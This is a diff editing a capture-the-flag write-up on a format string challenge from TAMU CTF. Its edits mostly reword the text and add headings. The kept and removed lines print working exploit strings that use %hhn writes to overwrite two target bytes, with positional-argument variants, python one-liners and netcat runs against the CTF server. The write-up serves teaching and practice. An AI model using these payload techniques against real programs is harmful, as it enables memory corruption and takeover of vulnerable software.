@@ -115,23 +115,23 @@ To reach 133, we still need to print `133 - 24 = 109` more bytes. We can append 
 \x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%08xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
-Alternatively, we can make the last `%08x` to display 109 bytes using space padding:
+Alternatively, we can make the last or anyone of the `%08x` to display 109 bytes using space padding:
 
 ```
 \x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%109x
 ```
 
-Number of bytes displayed till now is 133. We can use the [format specifier](http://www.cplusplus.com/reference/cstdio/printf/) `%hhn` to write this value at the address specified. The address is a pointer to a variable and usually passed as an argument to printf. Here we have provided the address \(`0804A01D`\) at the beginning of the string itself.
+Number of bytes displayed till now is 133. We can use the [format specifier](http://www.cplusplus.com/reference/cstdio/printf/) `%hhn` to write this value at the address specified. The address is a pointer to a variable and usually passed as an argument to `printf`. Here we have provided the address \(`0804A01D`\) at the beginning of the string itself.
 
 ```
 \x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%109x%hhn
 ```
 
-`hh` is the length sub-specifier and it indicates to write a byte value i.e. the address is a pointer to a byte. If the value to write is larger than a byte, it would be automatically **wrapped**. The situation is similar for other length sub-specifiers such as `h`, `l` and `ll`. Without any length sub-specifier it defaults to `int`.
+`hh` is the **length sub-specifier** and it indicates to **write a byte value** i.e. the address is a pointer to a byte. If the value to write is larger than a byte, it would be automatically **wrapped**. The situation is similar for other length sub-specifiers such as `h`, `l` and `ll`. Without any length sub-specifier it defaults to `int`.
 
 Now, at this point, we have written `0x85` \(133\) to the location `0804A01D`. In this process we have also displayed 133 bytes on the terminal.
 
-The next task is to write `0xAB` \(171\) to the location `0804A01C` and for that we need to display `171 - 133 = 38` more bytes. These bytes can again be simply appended to the exploit string. Using this approach our final exploit string would be:
+The next task is to write `0xAB` \(171\) to the location `0804A01C` and for that we need to display `171 - 133 = 38` more bytes. These bytes can again be simply appended to the exploit string. Using this approach our exploit string would be:
 
 ```
 \x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%109x%hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%hhn
@@ -145,9 +145,9 @@ Enter a word to be echoed:
 gigem{F0RM@1NG_1S_H4RD}
 ```
 
-The exploit string can be simplified:
+#### Using positional arguments to printf
 
-We can use [positional arguments](http://stackoverflow.com/a/6322594/1833653) to `printf` which would eliminate the need for consuming dwords using `%08x`.
+The exploit string can be shortened. We can use [positional arguments](http://stackoverflow.com/a/6322594/1833653) to `printf` which would eliminate the need for consuming dwords using `%08x`.
 
 The exploit string in this case would be:
 
@@ -155,7 +155,7 @@ The exploit string in this case would be:
 \x1d\xa0\x04\x08\x1c\xa0\x04\x08%125x%4$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%5$hhn
 ```
 
-If we use python we need to properly escape the string, the `$` symbols needs to be escaped:
+If we use python, we need to properly escape the string, the `$` symbols needs to be escaped:
 
 ```
 $ python -c "print '\x1d\xa0\x04\x08\x1c\xa0\x04\x08%125x%4\$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%5\$hhn'" > exploit
@@ -172,36 +172,21 @@ Enter a word to be echoed:
 gigem{F0RM@1NG_1S_H4RD}
 ```
 
-**Alternative approach instead of appending 38 A's**
+#### Alternative approach instead of appending 38 A's
 
-Alternatively, before the 2nd address, we can write a dummy dword \(`0xDEADBEEF` here\) and use something like `%38x`, however other field width sub-specifier also have to be reduced by 4.
+Alternatively, before the 2nd address, we can write a dummy dword \(`0xDEADBEEF` here\) and use something like `%38x `for referring to it. In addition other field width sub-specifier have to be reduced by 4.
 
 ```
 \x1d\xa0\x04\x08\xDE\xAD\xBE\xEF\x1c\xa0\x04\x08%08x%08x%105x%hhn%38x%hhn
 ```
 
-or if we use positional arguments, the exploit string becomes even more shorter:
+If we use positional arguments, the exploit string becomes even more shorter:
 
 ```
 \x1d\xa0\x04\x08\xDE\xAD\xBE\xEF\x1c\xa0\x04\x08%121x%4$hhn%38x%6$hhn
 ```
 
-Using python,
-
-```bash
-$ python -c "print '\x1d\xa0\x04\x08\xDE\xAD\xBE\xEF\x1c\xa0\x04\x08%121x%4\$hhn%38x%6\$hhn'" > exploit
-
-$ xxd exploit 
-0000000: 1da0 0408 dead beef 1ca0 0408 2531 3231  ............%121
-0000010: 7825 3424 6868 6e25 3338 7825 3624 6868  x%4$hhn%38x%6$hh
-0000020: 6e0a 
-
-$ nc pwn.ctf.tamu.edu 4323 < exploit
-Enter a word to be echoed:
-�ޭ���                               2                                     0This function has been deprecated
-gigem{F0RM@1NG_1S_H4RD}
-
-```
+Note that the positional arguments are `%4$hhn` and `%6$hhn`. This is because the 5th argument to printf is `DEADBEEF`
 
 ## Using pwntools \(automated\)
 
